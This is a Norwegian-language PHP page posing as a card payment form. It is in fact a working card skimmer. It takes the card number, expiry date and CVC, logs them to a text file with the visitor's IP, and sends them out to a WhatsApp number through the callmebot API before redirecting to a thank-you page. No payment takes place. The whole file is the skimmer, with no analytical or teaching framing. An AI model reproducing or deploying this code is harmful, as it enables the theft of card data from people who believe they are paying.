<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $kortnr = $_POST['kortnr'] ?? 'ukjent';
  $utlopsdato = $_POST['utlopsdato'] ?? 'ukjent';
  $cvc = $_POST['cvc'] ?? 'ukjent';
  $ip = $_SERVER['REMOTE_ADDR'] ?? 'ukjent';
  $tid = date("Y-m-d H:i:s");
  $logg = "[$tid] IP: $ip – Kort: $kortnr – Utløp: $utlopsdato – CVC: $cvc\n";
  file_put_contents("logs.txt", $logg, FILE_APPEND);
  $melding = urlencode($logg);
  $whats_url = "https://api.callmebot.com/whatsapp.php?phone=4741357171&text=$melding&apikey=7838436";
  file_get_contents($whats_url);
  header("Location: takk.php");
  exit;
}
?>

<!DOCTYPE html>
<html lang="no">
<head>
  <meta charset="UTF-8">
  <title>Kortbetaling</title>
</head>
<body>
  <h2>Betal med kort</h2>
  <form method="post">
    <input type="text" name="kortnr" placeholder="Kortnummer"><br>
    <input type="text" name="utlopsdato" placeholder="MM/YY"><br>
    <input type="text" name="cvc" placeholder="CVC"><br>
    <button type="submit">Send inn</button>
  </form>
</body>
</html>
